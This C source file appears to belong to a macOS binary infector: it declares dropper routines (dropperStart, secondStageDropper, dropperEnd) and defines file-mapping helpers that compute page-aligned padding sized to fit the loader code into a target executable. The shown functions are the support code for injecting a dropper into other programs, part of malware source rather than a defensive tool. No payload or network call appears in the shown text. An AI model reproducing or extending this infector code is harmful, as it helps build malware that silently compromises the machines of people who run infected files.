#ifdef __APPLE__
#include <libc.h>
#include <libgen.h>
#endif
#include <stdlib.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>

#ifdef __APPLE__
#include <sys/mman.h>
#else
#include <io.h>
#endif

#include <sys/stat.h>

#include "RCSMacInfectorUtil.h"

extern void dropperStart ();
extern void secondStageDropper ();
extern void dropperEnd ();

#define PAGE_ALIGNMENT  0x1000
#define LOADER_CODE_SIZE ((byte *)dropperEnd - (byte *)dropperStart)
int fdout;

void *
allocate (mSize_t nbytes)
{
  void *pointer;
  
  if ( !(pointer = malloc (nbytes)) )
    return (int *)kErrorMemoryAllocation;
  
  memset (pointer, 0, nbytes);
  
  return pointer;
}

char *
mapFile (char *filename, int *fileSize, _mHandle *fd, _mHandle *fdMap, int *padding)
{
  printf("filename: %s\n", filename);

  struct stat sb;
  char *filePointer;
  int displacement = 0;
  
  if (*fileSize == 0)
    {
      if (stat (filename, &sb) == kErrorGeneric)
        {
          return NULL;
        }
      
      *fileSize = sb.st_size;
#ifdef DEBUG
      printf ("[ii] input file size is %d\n", *fileSize);
#endif

#ifdef WIN32
    *fd = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (*fd == INVALID_HANDLE_VALUE)
      return NULL;

    *fdMap = CreateFileMapping(*fd, NULL, PAGE_READONLY, NULL, *fileSize, NULL);
    if (*fdMap == INVALID_HANDLE_VALUE)
      {
        CloseHandle(*fd);

        return NULL;
      }

    filePointer = (char *)MapViewOfFile(*fdMap, FILE_MAP_READ, NULL, NULL, 0);
    if (filePointer == NULL)
      {
        CloseHandle(*fd);
        CloseHandle(*fdMap);

        return NULL;
      }
#else
      if ((*fd = open (filename, O_RDONLY)) == kErrorGeneric)
        {
          printf ("[ee] Error while opening the file\n");
          return NULL;
        }
      
      if ((int)(filePointer = mmap (0, *fileSize, PROT_READ, MAP_PRIVATE, *fd, 0)) == kErrorGeneric)
        {
          close (*fd);
          return NULL;
        }
#endif
    }
  else
    {
      // Calculate padding including loader code size
      displacement = *fileSize % PAGE_ALIGNMENT;
      *padding = PAGE_ALIGNMENT - displacement;
      *padding += LOADER_CODE_SIZE;
    
      printf ("[ii] Calculated padding: %d\n", *padding);

#ifdef WIN32
      *fd = CreateFileA(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
      if (*fd == INVALID_HANDLE_VALUE)
        return NULL;

      *fdMap = CreateFileMapping(*fd, NULL, PAGE_READWRITE, NULL, *fileSize + *padding, NULL);
      if (*fdMap == INVALID_HANDLE_VALUE)
        {
          CloseHandle(*fd);
        
          return NULL;
        }

      filePointer = (char *)MapViewOfFile(*fdMap, FILE_MAP_READ | FILE_MAP_WRITE, NULL, NULL, 0);
      if (filePointer == NULL)
        {
          CloseHandle(*fd);
          CloseHandle(*fdMap);
        
          return NULL;
        }
#else
      if ((*fd = open (filename, O_RDWR | O_CREAT | O_TRUNC, 0755)) < 0)
        {
          printf ("[ee] Error while opening the file\n");
          return NULL;
        }
      
      if ((int)(filePointer = mmap (0, *fileSize + *padding, PROT_READ | PROT_WRITE,
                                    MAP_SHARED, *fd, 0)) == kErrorGeneric)
        {
          close (*fd);
          return NULL;
        }
#endif
    }
  
  return filePointer;
}